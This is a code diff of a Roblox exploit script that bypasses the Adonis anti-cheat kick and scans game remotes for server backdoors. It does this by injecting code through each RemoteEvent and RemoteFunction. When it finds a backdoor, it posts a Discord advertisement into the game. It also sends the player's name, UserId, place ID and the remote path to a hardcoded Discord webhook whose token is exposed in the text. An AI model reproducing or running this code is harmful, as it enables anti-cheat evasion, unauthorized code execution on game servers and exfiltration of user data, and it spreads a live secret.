@@ -1,6 +1,6 @@
 -- // Bypass Adonis
 
-_G.Game_Log = getgenv().Game_Log and true or false
+
 
 for k,v in pairs(game:GetDescendants()) do if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then v.tvk = {"kick",function() return false end} end end
 
@@ -200,6 +200,8 @@ Closure = function()
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
 
 export type RemoteDictionary = { [string]: RemoteFunction | RemoteEvent }
 
@@ -243,44 +245,53 @@ function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
         return false
     end
 
-    for _, remote in ipairs(game:GetDescendants()) do
-        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
-            local fullName = remote:GetFullName()
-            if not isExcluded(fullName) then
-                local code = "TempCode" .. tick()
-                self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
-                remotes[code] = remote
-            end
-        end
+   for _, remote in ipairs(game:GetDescendants()) do
+    if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+        local fullName = remote:GetFullName()
+        if isExcluded(fullName) then continue end
+        local code = "TempCode" .. tick()
+        self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+        remotes[code] = remote
     end
+end
+
 
     local function checkRemote(remote: RemoteFunction | RemoteEvent, code: string): boolean
-        if workspace:FindFirstChild(code) then
-            local elapsed = tick() - startTime
-            print("Backdoor found in " .. elapsed .. " seconds!")
-            statusLabel.Text = "Status : Inject"
-            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-
-            self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
-
-          
-            if Game_Log then
-                pcall(function()
-                    request({
-                        Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
-                        Method = 'POST',
-                        Headers = { ['Content-Type'] = 'application/json' },
-                        Body = HttpService:JSONEncode({
-                            username = 'Backdoor Scanner',
-                            content = "**User: `" .. game:GetService('Players').LocalPlayer.Name .. "` | `" .. game:GetService('Players').LocalPlayer.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. remote:GetFullName() .. "`**",
-                        })
-                    })
-                end)
-            end
-            return true
-        end
+    local backdoor = workspace:FindFirstChild(code)
+    if not backdoor then
         return false
     end
+    
+
+    local elapsed = tick() - startTime
+    print("Backdoor found in " .. elapsed .. " seconds!")
+    statusLabel.Text = "Status : Inject"
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+
+  
+    self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
+
+
+    if not getgenv().Game_Log then 
+       return 
+    end
+
+pcall(function()
+    request({
+        Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
+        Method = 'POST',
+        Headers = { ['Content-Type'] = 'application/json' },
+        Body = HttpService:JSONEncode({
+            username = 'Backdoor Scanner',
+            content = "**User: `" .. Client.Name .. "` | `" .. Client.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. remote:GetFullName() .. "`**",
+        })
+    })
+end)
+
+    
+    return true
+end
+
     
     
     
